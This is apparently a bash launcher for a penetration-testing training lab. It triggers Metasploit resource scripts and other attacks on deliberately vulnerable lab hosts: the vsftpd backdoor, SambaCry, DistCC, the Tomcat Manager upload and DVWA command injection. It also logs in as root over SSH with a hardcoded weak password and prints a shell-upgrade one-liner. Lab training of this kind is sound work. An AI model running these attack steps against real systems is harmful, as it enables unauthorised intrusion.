#!/bin/bash
# Quick exploit launcher for P3N73S7 L4B
# Usage: pwn <target>
#
# After you've done a lab manually, use this to see it automated.

SCRIPTS_DIR="$(dirname "$0")"

case "$1" in
    tomcat)
        echo "[*] Pwning Tomcat Manager (172.20.0.19)..."
        echo "[*] You'll get a shell - type 'id' to confirm access"
        echo "[*] Upgrade prompt with: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
        echo ""
        msfconsole -q -r "$SCRIPTS_DIR/pwn-tomcat.rc"
        ;;
    vsftpd)
        echo "[*] Pwning vsftpd backdoor (172.20.0.15)..."
        msfconsole -q -r "$SCRIPTS_DIR/pwn-vsftpd.rc"
        ;;
    ssh|vulnssh)
        echo "[*] Pwning SSH with weak creds (172.20.0.17)..."
        echo "[*] Password is 'password123'"
        echo ""
        sshpass -p 'password123' ssh -o StrictHostKeyChecking=no root@172.20.0.17
        ;;
    samba|sambacry)
        echo "[*] Pwning SambaCry CVE-2017-7494 (172.20.0.16)..."
        echo "[*] You'll get a Meterpreter session - type 'getuid' to confirm root"
        echo "[*] Drop to shell with: shell"
        echo ""
        msfconsole -q -r "$SCRIPTS_DIR/pwn-sambacry.rc"
        ;;
    distcc|metasploitable2)
        echo "[*] Pwning DistCC on Metasploitable2 (172.20.0.20)..."
        echo "[*] You'll get a shell - type 'id' to confirm access"
        echo ""
        msfconsole -q -r "$SCRIPTS_DIR/pwn-distcc.rc"
        ;;
    dvwa)
        "$SCRIPTS_DIR/pwn-dvwa.sh"
        ;;
    list|--list|-l)
        echo "Available targets:"
        echo "  dvwa      - Command Injection → shell (172.20.0.10)"
        echo "  tomcat    - Tomcat Manager upload (172.20.0.19)"
        echo "  vsftpd    - vsftpd 2.3.4 backdoor (172.20.0.15)"
        echo "  ssh       - SSH weak password (172.20.0.17)"
        echo "  sambacry  - SambaCry RCE (172.20.0.16)"
        echo "  distcc    - DistCC RCE on Metasploitable2 (172.20.0.20)"
        echo ""
        echo "Note: sqli-dvwa and juiceshop-sqli are data extraction,"
        echo "      not shell access - no pwn command for those."
        echo ""
        echo "Usage: pwn <target>"
        ;;
    *)
        echo "Usage: pwn <target>"
        echo "Run 'pwn list' to see available targets"
        exit 1
        ;;
esac
